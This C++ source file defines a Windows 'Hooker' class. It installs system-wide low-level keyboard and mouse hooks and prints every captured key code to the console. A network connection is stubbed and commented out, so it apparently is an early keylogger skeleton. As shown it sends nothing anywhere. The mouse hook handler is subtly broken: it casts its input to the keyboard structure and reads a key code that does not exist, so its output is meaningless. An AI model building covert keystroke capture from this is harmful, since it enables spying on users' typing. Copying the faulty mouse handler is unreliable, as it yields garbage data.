#include "Hooker.hh"

Hooker::Hooker(/*Network& network*/) /* :_network(network)*/ {
	isConnected() = connect();
	initializeHooks();
}

Hooker::~Hooker() {
	deInitializeHooks();
}

Hooker& Hooker::getInstance() {
	static Hooker    instance;
	return instance;
}


void Hooker::runHookLoop()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

bool Hooker::initializeHooks()
{
	_kHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	if (!_kHook) {
		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
		return false;
	}
	_mHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
	if (!_mHook) {
		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
		return false;
	}
	return true;
}

void Hooker::deInitializeHooks()
{
	UnhookWindowsHookEx(_kHook);
	UnhookWindowsHookEx(_mHook);
}

bool Hooker::connect()
{
	return false;
}

bool& Hooker::isConnected()
{
	return _connected;
}

/*
Network& Hooker::getNetwork()
{
	return _network;
}
*/

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0) {
		std::cout << nCode << std::endl;
		std::cout << wParam << std::endl;
		std::cout << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0) {
		std::cout << nCode << std::endl;
		std::cout << wParam << std::endl;
		std::cout << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

